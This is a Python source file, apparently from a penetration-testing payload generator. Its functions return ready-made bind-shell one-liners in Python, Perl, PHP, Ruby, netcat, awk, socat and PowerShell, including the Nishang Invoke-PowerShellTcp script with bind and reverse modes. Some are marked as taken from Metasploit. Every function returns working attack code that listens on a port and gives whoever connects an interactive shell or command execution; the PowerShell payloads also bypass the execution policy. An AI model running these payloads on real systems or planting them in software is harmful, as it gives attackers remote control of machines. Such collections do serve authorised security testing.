#!/usr/bin/env python

# Bind TCP shells

def BIND_PYTHON_TCP():
    return """python -c "import socket,subprocess,os;VAR1=socket.socket(socket.AF_INET,socket.SOCK_STREAM);VAR1.bind(('',PORT));VAR1.listen(1);conn,addr=VAR1.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);VAR2=subprocess.call(['/bin/bash','-i'])" """


def BIND_PYTHON_UDP():
    return """python -c 'while NUM1: from subprocess import Popen,PIPE;from socket import socket,AF_INET,SOCK_DGRAM;VAR1=socket(AF_INET,SOCK_DGRAM);VAR1.bind(("0.0.0.0",PORT));VAR2,VAR3=VAR1.recvfrom(8096);VAR4=Popen(VAR2,shell=True,stdout=PIPE,stderr=PIPE).communicate();VAR1.sendto("".join([VAR4[0],VAR4[1]]),VAR3)'"""


def BIND_PERL_TCP():
    return """perl -MSocket -e '$VAR1=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($VAR1, INADDR_ANY));listen(S,SOMAXCONN);for(;$VAR1=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'"""


def BIND_PERL_UDP():
    return """perl -MIO::Socket::INET -e '$|=1;$VAR1=new IO::Socket::INET->new();$VAR1 = new IO::Socket::INET(LocalPort => PORT,Proto => "udp");while(NUM1){ $VAR1->recv($VAR2,1024);$VAR3=$VAR1->peerhost();$VAR4=$VAR1->peerport();$VAR5=qx($VAR2);$VAR1->send($VAR5);}'"""


def BIND_PHP_TCP():
    return """php -r '$VAR1=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($VAR1,"0.0.0.0",PORT);socket_listen($VAR1,1);$VAR2=socket_accept($VAR1);while(NUM1){if(!socket_write($VAR2,"$ ",2))exit;$VAR3=socket_read($VAR2,100);$VAR4=popen("$VAR3","r");while(!feof($VAR4)){$VAR5=fgetc($VAR4);socket_write($VAR2,$VAR5,strlen($VAR5));}}'"""


def BIND_PHP_UDP():
    return """php -r '$VAR1=socket_create(AF_INET,SOCK_DGRAM, 0);socket_bind($VAR1,"0.0.0.0",PORT);while(NUM1){socket_recvfrom($VAR1,$VAR2,1024,0,$VAR3,$VAR4);$VAR5=shell_exec($VAR2);socket_sendto($VAR1,$VAR5,1024,0,$VAR3,$VAR4);}'"""


def BIND_RUBY_TCP():
    return """ruby -rsocket -e 'VAR1=TCPServer.new(PORT);VAR2=VAR1.accept;VAR1.close();$stdin.reopen(VAR2);$stdout.reopen(VAR2);$stderr.reopen(VAR2);$stdin.each_line{|VAR3|VAR3=VAR3.strip;next if VAR3.length==0;(IO.popen(VAR3,"rb"){|VAR4|VAR4.each_line{|VAR5|c.puts(VAR5.strip)}})rescue nil}'"""


def BIND_RUBY_UDP():
    return """ruby -rsocket -e 'require "open3";VAR1=UDPSocket.new;VAR1.bind("0.0.0.0",PORT);loop do VAR2,VAR3=VAR1.recvfrom(1024);VAR4,VAR5,VAR6=Open3.capture3(VAR2);VAR1.send(VAR4,0,VAR3[3],VAR3[1]); end'"""


def BIND_NETCAT_TCP():
    return """rm /tmp/VAR1;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|nc -lvp PORT >/tmp/VAR1"""


def BIND_NETCAT_OPENBSD_UDP():
    return """coproc nc -luvp PORT; exec /bin/bash <&0${COPROC[0]} >&${COPROC[1]} 2>&1"""


def BIND_NETCAT_TRADITIONAL_TCP():
    return """nc -lvp PORT -c /bin/bash"""


def BIND_POWERSHELL_TCP():
    return """powershell.exe -nop -ep bypass -Command "$VAR1=PORT;$VAR2=[System.Net.Sockets.TcpListener]$VAR1;$VAR2.Start();$VAR3=$VAR2.AcceptTCPClient();$VAR4=$VAR3.GetStream();[byte[]]$VAR5=0..65535|%{0};$VAR6=([text.encoding]::ASCII).GetBytes('Windows PowerShell running as user '+$env:username+' on '+$env:computername+'`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n');$VAR4.Write($VAR6,0,$VAR6.Length);$VAR6=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'> ');$VAR4.Write($VAR6,0,$VAR6.Length);while(($VAR7=$VAR4.Read($VAR5,0,$VAR5.Length)) -ne 0){$VAR8=([text.encoding]::ASCII).GetString($VAR5,0,$VAR7);try{$VAR9=(Invoke-Expression -command $VAR8 2>&1 | Out-String )}catch{Write-Warning 'Something went wrong with execution of command on the target.';Write-Error $_;};$VAR10=$VAR9+ 'PS '+(Get-Location).Path + '> ';$VAR11=($error[0] | Out-String);$error.clear();$VAR10=$VAR10+$VAR11;$VAR6=([text.encoding]::ASCII).GetBytes($VAR10);$VAR4.Write($VAR6,0,$VAR6.Length);$VAR4.Flush();};$VAR3.Close();if($VAR2){$VAR2.Stop();};" """


# Removed from MetasploitFramework
# https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/cmd/unix/bind_awk.rb
def BIND_AWK_TCP():
    return """VAR1=PORT;awk -v VAR2="$VAR1" 'BEGIN{VAR3=\"/inet/tcp/"VAR2"/0/0\";for(;VAR3|&getline VAR4;close(VAR4))while(VAR4|getline)print|&VAR3;close(VAR3)}'"""


# Removed from MetasploitFramework
# https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/cmd/unix/bind_socat_udp.rb
def BIND_SOCAT_UDP():
    return "socat udp-listen:PORT exec:'bash -li',pty,stderr,sane 2>&1>/dev/null &"


def BIND_POWERSHELL_NISHANG_TCP():
    return """function Invoke-PowerShellTcp 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )


    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Bind -Port PORT"""
